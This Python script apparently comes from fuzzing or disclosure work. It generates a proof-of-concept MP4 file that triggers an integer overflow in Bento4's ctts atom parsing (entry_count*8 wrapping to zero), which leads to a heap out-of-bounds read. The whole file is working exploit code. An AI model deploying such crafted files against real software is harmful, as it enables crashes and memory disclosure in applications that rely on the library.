#!/usr/bin/env python3
"""
PoC generator for Bento4 VULN 002:
AP4_CttsAtom - Integer Overflow in entry_count*8 -> Zero-Size Buffer -> Heap OOB Read
CWE-190 (Integer Overflow) -> CWE-125 (Out-of-Bounds Read)

When entry_count = 0x20000000, the expression entry_count * 8 wraps to 0
(on 32-bit multiplication), allocating a zero-byte buffer. The subsequent
loop reading buffer[i*8] for i >= 2 reads beyond the allocation.
"""

import struct
import os

OUTPUT_DIR = '/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Atom_h'
OUTPUT_FILE = os.path.join(OUTPUT_DIR, 'vuln_002.mp4')


def box(type_str, payload=b''):
    """Build a standard ISO box: 4B size + 4B type + payload."""
    t = type_str.encode('ascii') if isinstance(type_str, str) else type_str
    size = 8 + len(payload)
    return struct.pack('>I4s', size, t) + payload


def fullbox(type_str, version=0, flags=0, payload=b''):
    """Build a FullBox: box header + 1B version + 3B flags + payload."""
    fb = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF))
    return box(type_str, fb + payload)


# --- ctts box with entry_count = 0x20000000 (the trigger) ---
# entry_count * 8 = 0x100000000 overflows 32-bit to 0
# Results in zero-size buffer allocation, then OOB read in the loop
ctts_payload = struct.pack('>I', 0x20000000)  # entry_count = 536870912, no actual entries
ctts = fullbox('ctts', version=0, flags=0, payload=ctts_payload)

# --- Minimal stts (sample-to-time, required in stbl) ---
stts = fullbox('stts', version=0, flags=0, payload=struct.pack('>I', 0))  # entry_count=0

# --- Minimal stsc (sample-to-chunk) ---
stsc = fullbox('stsc', version=0, flags=0, payload=struct.pack('>I', 0))  # entry_count=0

# --- Minimal stsz (sample sizes) ---
stsz = fullbox('stsz', version=0, flags=0, payload=struct.pack('>II', 0, 0))  # sample_size=0, sample_count=0

# --- Minimal stco (chunk offsets) ---
stco = fullbox('stco', version=0, flags=0, payload=struct.pack('>I', 0))  # entry_count=0

# --- Minimal stsd (sample description) ---
stsd = fullbox('stsd', version=0, flags=0, payload=struct.pack('>I', 0))  # entry_count=0

# --- stbl: Sample Table Box ---
stbl = box('stbl', stsd + stts + stsc + stsz + stco + ctts)

# --- dinf with minimal dref ---
# url entry: version=0, flags=1 (self-contained)
url_entry = fullbox('url ', version=0, flags=1, payload=b'')
dref = fullbox('dref', version=0, flags=0, payload=struct.pack('>I', 1) + url_entry)
dinf = box('dinf', dref)

# --- smhd: Sound Media Header ---
smhd = fullbox('smhd', version=0, flags=0, payload=struct.pack('>HH', 0, 0))  # balance + reserved

# --- minf: Media Information Box ---
minf = box('minf', smhd + dinf + stbl)

# --- mdhd: Media Header ---
# version=0: creation_time(4), modification_time(4), timescale(4), duration(4), language(2), pre_defined(2)
mdhd_payload = struct.pack('>IIIIIH', 0, 0, 44100, 0, 0x15C7, 0)  # language='und' = 0x15C7
mdhd = fullbox('mdhd', version=0, flags=0, payload=mdhd_payload)

# --- hdlr: Handler Reference ---
# pre_defined(4), handler_type(4), reserved(12), name(null-terminated)
hdlr_payload = struct.pack('>I4s12s', 0, b'soun', b'\x00' * 12) + b'Sound\x00'
hdlr = fullbox('hdlr', version=0, flags=0, payload=hdlr_payload)

# --- mdia: Media Box ---
mdia = box('mdia', mdhd + hdlr + minf)

# --- tkhd: Track Header ---
# version=0, flags=3 (track_enabled | track_in_movie)
# creation_time(4), modification_time(4), track_id(4), reserved(4), duration(4),
# reserved(8), layer(2), alternate_group(2), volume(2), reserved(2),
# matrix(36), width(4), height(4)
tkhd_payload = struct.pack('>IIIII', 0, 0, 1, 0, 0)  # times, track_id, reserved, duration
tkhd_payload += struct.pack('>II', 0, 0)               # reserved[2]
tkhd_payload += struct.pack('>hhhh', 0, 0, 0x0100, 0)  # layer, alt_group, volume, reserved
# Unity matrix: { 0x00010000,0,0, 0,0x00010000,0, 0,0,0x40000000 }
tkhd_payload += struct.pack('>9I', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
tkhd_payload += struct.pack('>II', 0, 0)               # width, height
tkhd = fullbox('tkhd', version=0, flags=3, payload=tkhd_payload)

# --- trak: Track Box ---
trak = box('trak', tkhd + mdia)

# --- mvhd: Movie Header ---
# version=0: creation_time(4), modification_time(4), timescale(4), duration(4),
# rate(4), volume(2), reserved(10), matrix(36), pre_defined(24), next_track_id(4)
mvhd_payload = struct.pack('>IIII', 0, 0, 1000, 0)    # times, timescale, duration
mvhd_payload += struct.pack('>Ih', 0x00010000, 0x0100) # rate=1.0, volume=1.0
mvhd_payload += b'\x00' * 10                            # reserved
# Unity matrix
mvhd_payload += struct.pack('>9I', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
mvhd_payload += b'\x00' * 24                            # pre_defined
mvhd_payload += struct.pack('>I', 2)                    # next_track_id
mvhd = fullbox('mvhd', version=0, flags=0, payload=mvhd_payload)

# --- moov: Movie Box ---
moov = box('moov', mvhd + trak)

# --- ftyp: File Type Box ---
ftyp = box('ftyp', b'isom' + struct.pack('>I', 0x00000000) + b'isom' + b'iso2')

# --- Assemble final MP4 ---
data = ftyp + moov

os.makedirs(OUTPUT_DIR, exist_ok=True)
with open(OUTPUT_FILE, 'wb') as f:
    f.write(data)

print(f'Written {len(data)} bytes to {OUTPUT_FILE}')
print(f'ctts entry_count = 0x20000000 (536870912)')
print(f'Expected: entry_count*8 overflows 32-bit to 0, zero-byte allocation, OOB read')
